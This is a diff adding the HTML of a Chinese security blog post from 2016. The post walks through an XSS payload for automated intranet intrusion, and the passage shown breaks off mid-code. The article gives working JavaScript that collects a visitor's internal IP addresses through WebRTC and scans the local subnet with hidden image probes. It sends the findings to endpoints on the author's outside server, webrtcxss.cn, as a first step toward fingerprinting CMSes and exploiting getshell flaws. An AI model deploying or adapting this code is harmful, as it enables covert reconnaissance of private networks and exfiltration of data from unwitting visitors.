@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>浏览器插件的攻击向量 | Black-Hole&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x01 前言：
+很多人都认为XSS只能做盗取cookies的活。以至于有些SRC、厂商对待反射型XSS视而不见，或者说是根本不重视。
+直到“黑哥”在之前的演讲中提到XSS入侵内网，情况才得以好转。但是经过本人测试，黑哥所说的XSS内网入侵，应该是包含了浏览器漏洞。那没有浏览器漏洞该如何呢？就像0x_Jin之前在乌云报道的搜狐漏洞那样：http://www.wooyun.org/bugs/woo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浏览器插件的攻击向量">
+<meta property="og:url" content="http://bugs.cc/2016/12/14/XSS自动化入侵内网/index.html">
+<meta property="og:site_name" content="Black-Hole's Blog">
+<meta property="og:description" content="0x01 前言：
+很多人都认为XSS只能做盗取cookies的活。以至于有些SRC、厂商对待反射型XSS视而不见，或者说是根本不重视。
+直到“黑哥”在之前的演讲中提到XSS入侵内网，情况才得以好转。但是经过本人测试，黑哥所说的XSS内网入侵，应该是包含了浏览器漏洞。那没有浏览器漏洞该如何呢？就像0x_Jin之前在乌云报道的搜狐漏洞那样：http://www.wooyun.org/bugs/woo">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/1.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/2.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/3.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/4.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/5.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/6.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/7.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/8.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/9.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/10.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/11.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/12.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/13.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/14.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/15.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/16.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/17.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/18.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/19.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/20.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/21.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/22.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/23.png">
+<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/24.png">
+<meta property="og:updated_time" content="2016-12-14T14:43:04.905Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="浏览器插件的攻击向量">
+<meta name="twitter:description" content="0x01 前言：
+很多人都认为XSS只能做盗取cookies的活。以至于有些SRC、厂商对待反射型XSS视而不见，或者说是根本不重视。
+直到“黑哥”在之前的演讲中提到XSS入侵内网，情况才得以好转。但是经过本人测试，黑哥所说的XSS内网入侵，应该是包含了浏览器漏洞。那没有浏览器漏洞该如何呢？就像0x_Jin之前在乌云报道的搜狐漏洞那样：http://www.wooyun.org/bugs/woo">
+<meta name="twitter:image" content="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/1.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/header.png" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Black-Hole</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+						<li>关于我</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="/tags/WEB安全/">WEB安全</a></li>
+				        
+							<li><a href="/tags/随笔">随笔</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/BlackHole1" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="http://weibo.com/comelove" title="weibo">weibo</a>
+					        
+								<a class="twitter" target="_blank" href="https://twitter.com/Free_BlackHole" title="twitter">twitter</a>
+					        
+								<a class="mail" target="_blank" href="/158blackhole@gmail.com" title="mail">mail</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/Other/" style="font-size: 15px;">Other</a> <a href="/tags/WEB安全/" style="font-size: 20px;">WEB安全</a> <a href="/tags/无线安全/" style="font-size: 10px;">无线安全</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://vim0x3c.github.io">vim0x3c</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.duoluosb.com">堕络</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.pangzi9527.com">pangzi</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://lonelyrain.me">LonelyRain</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://hackfun.org">4ido10n</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.kidoplay.com">kido</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.exp1oit.com">Exploit School</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">我本将心向明月，奈何明月照沟渠</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">Black-Hole</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img lazy-src="/img/header.png" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">Black-Hole</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="/tags/WEB安全/">WEB安全</a></li>
+		        
+					<li><a href="/tags/随笔">随笔</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/BlackHole1" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="http://weibo.com/comelove" title="weibo">weibo</a>
+			        
+						<a class="twitter" target="_blank" href="https://twitter.com/Free_BlackHole" title="twitter">twitter</a>
+			        
+						<a class="mail" target="_blank" href="/158blackhole@gmail.com" title="mail">mail</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-XSS自动化入侵内网" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/12/14/XSS自动化入侵内网/" class="article-date">
+  	<time datetime="2016-12-14T14:40:25.000Z" itemprop="datePublished">2016-12-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      浏览器插件的攻击向量
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB安全/">WEB安全</a></li></ul>
+	</div>
+
+        
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<h3 id="0x01-前言："><a href="#0x01-前言：" class="headerlink" title="0x01 前言："></a>0x01 前言：</h3></blockquote>
+<p>很多人都认为XSS只能做盗取cookies的活。以至于有些SRC、厂商对待反射型XSS视而不见，或者说是根本不重视。</p>
+<p>直到“黑哥”在之前的演讲中提到XSS入侵内网，情况才得以好转。但是经过本人测试，黑哥所说的XSS内网入侵，应该是包含了浏览器漏洞。那没有浏览器漏洞该如何呢？就像0x_Jin之前在乌云报道的搜狐漏洞那样：<a href="http://www.wooyun.org/bugs/wooyun-2014-076685" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-076685</a></p>
+<p>这里有几个需要注意的地方：由于浏览器的同源策略问题导致没有办法做到真正意义上的内网入侵，当然如果你又浏览器的0day，那事情就另当别论了。</p>
+<p>而0x_Jin在乌云中的那篇漏洞报告，我自己本人也去问了。答复就是只是检测了开放的80端口，就没有后续了。黑哥没有公布完整的代码，0x_Jin没有深入。既然都没有，就交给我吧。这里我将会使用其他办法“绕过浏览器的同源策略”。</p>
+<blockquote>
+<h3 id="0x02构架："><a href="#0x02构架：" class="headerlink" title="0x02构架："></a>0x02构架：</h3></blockquote>
+<p>代码采用了类似XSS平台那种实时反馈机制。在这里我先把变量介绍一遍：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> onlyString           = <span class="string">"abc"</span>;</span><br><span class="line"><span class="keyword">var</span> ipList               = [];</span><br><span class="line"><span class="keyword">var</span> survivalIpLIst       = [];</span><br><span class="line"><span class="keyword">var</span> deathIpLIst          = [];</span><br><span class="line"><span class="keyword">var</span> sendsurvivalIp       = <span class="string">"http://webrtcxss.cn/Api/survivalIp"</span>;</span><br><span class="line"><span class="keyword">var</span> snedIteratesIpUrl    = <span class="string">"http://webrtcxss.cn/Api/survivalPortIp"</span>;</span><br><span class="line"><span class="keyword">var</span> snedIteratesCmsIpUrl = <span class="string">"http://webrtcxss.cn/Api/survivalCmsIp"</span>;</span><br><span class="line"><span class="keyword">var</span> sendExistenceVul     = <span class="string">"http://webrtcxss.cn/Api/existenceVul"</span>;</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<ol>
+<li><p>onlyString ： 唯一字符串，用于让服务器识别当前发送的请求是哪一个项目，真实代码是不会写成abc的，会使用md5(date(‘Y-m-d H:i:s’))来生成hash。</p>
+</li>
+<li><p>ipList ： 数组变量用来储存webrtc获取的内网IP地址。</p>
+</li>
+<li><p>survivalIpLIst ： 数组对象用于存放开放80端口的IP地址</p>
+</li>
+<li><p>deathIpLIst ： 数组对象用于存放不存在80端口的IP，用于判断</p>
+</li>
+<li><p>sendsurvivalIp ： 发送当前内网IP的信息到服务端</p>
+</li>
+<li><p>snedIteratesIpUrl ： 从服务端反馈的cms路径对当前存在80端口的IP进行判断，看现有存活的IP地址是否可以在服务端里找到所匹配的CMS信息</p>
+</li>
+<li>snedIteratesCmsIpUrl ： 用于在已匹配到的cms信息里，从服务端里验证这个cms是否存在我们在服务端里所保存的getshell漏洞</li>
+<li>sendExistenceVul ： 已确定漏洞，发送到服务端</li>
+</ol>
+<p>之前在0x01前言里说到，这里我将会使用其他办法“绕过浏览器的同源策略”。现在我就来说说如何构架、整段代码的构架把：</p>
+<p>WebRTC获取到内网IP-&gt;遍历内网存在80端口的IP地址-&gt;检测开放80端口IP属于哪一种CMS类型-&gt;利用getshell生成js文件-&gt;是否存在js文件-&gt;存在JS文件-&gt;发送到服务端，漏洞存在-&gt;</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/1.png" alt=""></p>
+<p>-&gt;不存在JS文件-&gt;漏洞不存在，结束。<br>详情请移步到：<a href="https://www.processon.com/view/link/5711cdc6e4b0d7e7748c34ec" target="_blank" rel="external">https://www.processon.com/view/link/5711cdc6e4b0d7e7748c34ec</a></p>
+<blockquote>
+<h3 id="0x03获取内网的IP信息："><a href="#0x03获取内网的IP信息：" class="headerlink" title="0x03获取内网的IP信息："></a>0x03获取内网的IP信息：</h3></blockquote>
+<p>详情请移步到：<a href="https://webrtc.org/faq/#what-is-webrtc" target="_blank" rel="external">https://webrtc.org/faq/#what-is-webrtc</a><br>因为WebRTC让JavaScript具有了一定的底层操作方法，而由于WebRTC的特殊性，让我们可以使用JavaScript来获取到内网IP。目前WebRTC支持的平台有：Chrome、Firefox、Opera、Android、IOS。实际测试的时候maxthon也是支持的（此处有伏笔）。<br>WebRTC获取内网IP这段代码网上是可以找到的，而在这里需要修改一下。方便其他代码容易调用。<br>然后就是webrtc的代码了：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> webrtcxss = &#123;</span><br><span class="line">    webrtc : <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ip_dups           = &#123;&#125;;</span><br><span class="line">        <span class="keyword">var</span> RTCPeerConnection = <span class="built_in">window</span>.RTCPeerConnection || <span class="built_in">window</span>.mozRTCPeerConnection || <span class="built_in">window</span>.webkitRTCPeerConnection;</span><br><span class="line">        <span class="keyword">var</span> mediaConstraints  = &#123;</span><br><span class="line">            optional: [&#123;RtpDataChannels: <span class="literal">true</span>&#125;]</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> servers = <span class="literal">undefined</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">window</span>.webkitRTCPeerConnection)&#123;</span><br><span class="line">            servers = &#123;iceServers: []&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> pc = <span class="keyword">new</span> RTCPeerConnection(servers, mediaConstraints);</span><br><span class="line">        pc.onicecandidate = <span class="function"><span class="keyword">function</span>(<span class="params">ice</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(ice.candidate)&#123;</span><br><span class="line">                <span class="keyword">var</span> ip_regex        = <span class="regexp">/([0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;)/</span>;</span><br><span class="line">                <span class="keyword">var</span> ip_addr         = ip_regex.exec(ice.candidate.candidate)[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span>(ip_dups[ip_addr] === <span class="literal">undefined</span>)</span><br><span class="line">                callback(ip_addr);</span><br><span class="line">                ip_dups[ip_addr] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        pc.createDataChannel(<span class="string">""</span>);</span><br><span class="line">        pc.createOffer(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">            pc.setLocalDescription(result, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    getIp : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.webrtc(<span class="function"><span class="keyword">function</span>(<span class="params">ip</span>)</span>&#123;</span><br><span class="line">            ipList.push(ip);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">webrtcxss.getIp();</span><br></pre></td></tr></table></figure></p>
+<p>现在我们来打印一下看看：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/2.png" alt=""></p>
+<p>已经获取到了我当前主机的IP地址了。</p>
+<blockquote>
+<h3 id="0x04检测内网中开启了80端口的IP："><a href="#0x04检测内网中开启了80端口的IP：" class="headerlink" title="0x04检测内网中开启了80端口的IP："></a>0x04检测内网中开启了80端口的IP：</h3></blockquote>
+<p>上一节的结尾可以看到<code>webrtcxss.getIp()</code>;已经调用了WebRTC来获取到内网的IP信息，IP保存在ipList数组变量里。这里就要检测内网中所有开放80端口的IP了。这里我写了一个函数来把这一步放到函数里：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iteratesIp</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    stage(<span class="number">1</span>)</span><br><span class="line">    ipAjax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    ipAjax.open(<span class="string">'POST'</span>, sendsurvivalIp, <span class="literal">false</span>);</span><br><span class="line">    ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">    ipAjax.send(<span class="string">'survivalip='</span>+ ipList.join(<span class="string">"-"</span>) + <span class="string">'&amp;onlystring='</span> + onlyString);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; ipList.length;i++)&#123;</span><br><span class="line">        incompleteIp = ipList[i].split(<span class="string">"."</span>);</span><br><span class="line">        incompleteIp.pop();</span><br><span class="line">        incompleteIp = incompleteIp.join(<span class="string">"."</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">1</span>;j &lt; <span class="number">255</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> ip = incompleteIp + <span class="string">"."</span> + j;</span><br><span class="line">            <span class="keyword">var</span> imgTag = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">            imgTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span> + ip + <span class="string">"/favicon.ico"</span>);</span><br><span class="line">            imgTag.setAttribute(<span class="string">"onerror"</span>,<span class="string">"javascript:deathIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</span><br><span class="line">            imgTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:survivalIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</span><br><span class="line">            imgTag.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</span><br><span class="line">            <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(imgTag);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(<span class="string">"iteratesIp()"</span>,<span class="number">20000</span>);</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(deathIpLIst.length + survivalIpLIst.length == <span class="number">254</span>)&#123;</span><br><span class="line">        snedIteratesIpData(survivalIpLIst);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        setTimeout(<span class="built_in">arguments</span>.callee,<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
+<p>至于其中的<code>stage(1)</code>是我自己写的一个函数，用于实时向服务端发送当前最新的运行情况，我们放到最后再说。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipAjax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">ipAjax.open(<span class="string">'POST'</span>, sendsurvivalIp, <span class="literal">false</span>);</span><br><span class="line">ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">ipAjax.send(<span class="string">'survivalip='</span>+ ipList.join(<span class="string">"-"</span>) + <span class="string">'&amp;onlystring='</span> + onlyString);</span><br></pre></td></tr></table></figure></p>
+<p>这段代码是把当前获取到的内网IP发送到服务端，至于为什么要在ipList后面加上join(“-“)函数是因为WebRTC有时会把获取网关、VM虚拟机的IP也获取上来。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; ipList.length;i++)&#123;</span><br><span class="line">    incompleteIp = ipList[i].split(<span class="string">"."</span>);</span><br><span class="line">    incompleteIp.pop();</span><br><span class="line">    incompleteIp = incompleteIp.join(<span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">1</span>;j &lt; <span class="number">255</span>;j++)&#123;</span><br><span class="line">        <span class="keyword">var</span> ip = incompleteIp + <span class="string">"."</span> + j;</span><br><span class="line">        <span class="keyword">var</span> imgTag = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">        imgTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span> + ip + <span class="string">"/favicon.ico"</span>);</span><br><span class="line">        imgTag.setAttribute(<span class="string">"onerror"</span>,<span class="string">"javascript:deathIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</span><br><span class="line">        imgTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:survivalIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</span><br><span class="line">        imgTag.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</span><br><span class="line">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(imgTag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这段代码是遍历所有内网主机80端口的。我们来实际看下把：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/3.png" alt=""></p>
+<p>后面的.104被我们去掉了。然后利用for循环来遍历192.168.1.1~192.168.1.254<br>现在我们来运行<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; ipList.length;i++)&#123;</span><br><span class="line">    incompleteIp = ipList[i].split(<span class="string">"."</span>);</span><br><span class="line">    incompleteIp.pop();</span><br><span class="line">    incompleteIp = incompleteIp.join(<span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">1</span>;j &lt; <span class="number">255</span>;j++)&#123;</span><br><span class="line">        <span class="keyword">var</span> ip = incompleteIp + <span class="string">"."</span> + j;</span><br><span class="line">        <span class="keyword">var</span> imgTag = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">        imgTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span> + ip + <span class="string">"/favicon.ico"</span>);</span><br><span class="line">        imgTag.setAttribute(<span class="string">"onerror"</span>,<span class="string">"javascript:deathIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</span><br><span class="line">        imgTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:survivalIpLIst.push('"</span>+ip+<span class="string">"')"</span>);</span><br><span class="line">        imgTag.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</span><br><span class="line">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(imgTag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这段代码：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/4.png" alt=""></p>
+<p>这是控制台的效果，我们来看下DOM发生了哪些变化把：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/5.png" alt=""></p>
+<p>这里我使用的是<code>http://192.168.1.xxx/favicon.ico</code>来判断内网哪些IP开启了80端口，并且上面运行着站点。<br>其中的<code>onerror=&quot;javascript:deathIpLIst.push(&#39;192.168.1.xxx&#39;)&quot;</code>是如果此IP没有开启80端口，或者开启了80端口，但是没有运行站点的话，就调用把当前的IP地址push到deathIpLIst变量里。如果存在的话就push到survivalIpLIst变量里，也就是这段代码：<code>onload=&quot;javascript:survivalIpLIst.push(&#39;192.168.1.1&#39;)&quot;</code><br>至于为什么要这么做呢，这里就要涉及一个坑了。浏览器是不会你加载了哪些图片就立刻告诉你哪些图片是可以访问，哪些图片是不能访问的，浏览器需要一个缓冲的时间。检测同一网段里254个主机是否存在favicon.ico，大约需要花费550000ms===550s约等于2.16535s/IP。也就是9.16多分钟。也就是全部检测完需要等待9.16分钟。这也是没办法的事，改变不了。<br>至于下面为什么要使用<code>setTimeout(&quot;iteratesIp()&quot;,20000);</code>来延迟20秒执行呢，因为WebRTC获取IP需要一定的时间，其实几秒钟就好了。但是为了提高容错率我把时间提高到20秒的时间，如果你嫌慢，可以在文章结尾下载源代码，修改。<br>还有一段代码是这样的：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(deathIpLIst.length + survivalIpLIst.length == <span class="number">254</span>)&#123;</span><br><span class="line">        snedIteratesIpData(survivalIpLIst);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        setTimeout(<span 